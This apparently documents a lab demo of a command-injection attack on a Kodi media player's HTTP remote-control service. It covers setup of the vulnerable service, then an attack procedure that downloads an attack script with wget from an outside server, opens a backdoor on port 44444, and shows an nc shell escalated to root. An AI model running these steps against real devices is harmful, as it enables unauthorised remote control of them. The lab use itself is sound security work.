# Command Line Injection Attack

**Attack description** Victim host (say embedded / IoT device that runs Linux) runs Mediaplayer (Kodi client), and it exports remote control API as a web service. One of its input sanitizations has an error that failing to filter invalid input from the outside, in turn allowing attackers to inject arbitrary command blended in one of its requests. This attack is inspired by the Jeep-Cherokee attack case where the attacker from remote gains control over the vehicle. 

## Instruction


## Installation and set-up

### Packages to install and configuration

```
sudo apt install kodi d-feet python-pip
sudo apt install libdbus-1-dev libdbus-glib-1-dev
pip install dbus
pip3 install dbus
```

* After installing Kodi, you need to do the followings
    1. Install `Youtube` video add-on
    2. Configure `remote control via HTTP` which is under `setting` --> `service settings` --> `control`
        * Port number hostname: localhost, port: 8080, username: kodi, password: kodi     
            * **[NOTE]** above configuration needs to be consistent with configuration in `/usr/local/bin/kodi-cli`

            ```
            304 ## ---- Configuration --- ##
            305 ## Configure your KODI RPC details here
            306 KODI_HOST=localhost
            307 KODI_PORT=8080
            308 KODI_USER=kodi
            309 KODI_PASS=kodi
            310 LOCK=false
            ```

### KODI configuration

1. User systemd configuration 
    * Download files from http://www.syssec.org:9000/lvCuc/kodi.tar 
    * Copy files to local user systemd directory `$HOME/.config/systemd/user`
    * Enable services by running the following commands
    ```
    systemctl --user enable kodi_dbus
    systemctl --user enable kodi_web
    ```
    
    * Check the status of services using the following commands
    ```
    systemctl --user status kodi_dbus
    systemctl --user status kodi_web
    ```
    
    **[NOTE]** If the above services are not running correctly, 
    ```
    /usr/bin/python3 /opt/NECLA/SBrainDemo/kodi_dbus.py
    /usr/bin/python /opt/NECLA/SBrainDemo/kodi_web.py
    ```

2. Install remote control Kodi 
    * Download file from http://www.syssec.org:9000/OG3qe/sbdemo.tar
    * Untar files and copy those under `/opt/NECLA/`
    * copy `kodi-cli` from `/opt/NECLA/SBrainDemo/` to `/usr/localbin/`

## Attack procedure

### Set-up

* attacker host: wlab2-lin1
* victim host: wlab2-lin0

### Attack operation
0. Login to victim host and make sure kodi media player is running. The following is captured screen from remote deskop. 
    
![](https://i.imgur.com/YiMrl7b.jpg =400x)


1. Login to attacker host
2. Download attack script with the following command
    ```
    wget http://www.syssec.org:9000/KOQ4R/cmd-injection.py
    ```
3. Run python script `python cmd-injection.py <victim-ip>`
    * scripting will run for about a minute and connect to victim host and open a backdoor at port 44444

4. Connects to victim's backdoor
```
$ nc  wlab2-lin0 44444
id
uid=1000(white-lab0) gid=1000(white-lab0) groups=1000(white-lab0)
sudo su -
id
uid=0(root) gid=0(root) groups=0(root)
hostname
wlab2-lin0
```

### Regular operation

In normal situation, users will connect to web service and remotely control media player. Webservice is open at lambda3 and accessible via http://lambda3:8001 

* From the service, you should be able to see the following interface.

![](https://i.imgur.com/PwuivLD.jpg =300x)


## Resources



###### tags: `kodi`,`linux`,`attack`,`injection`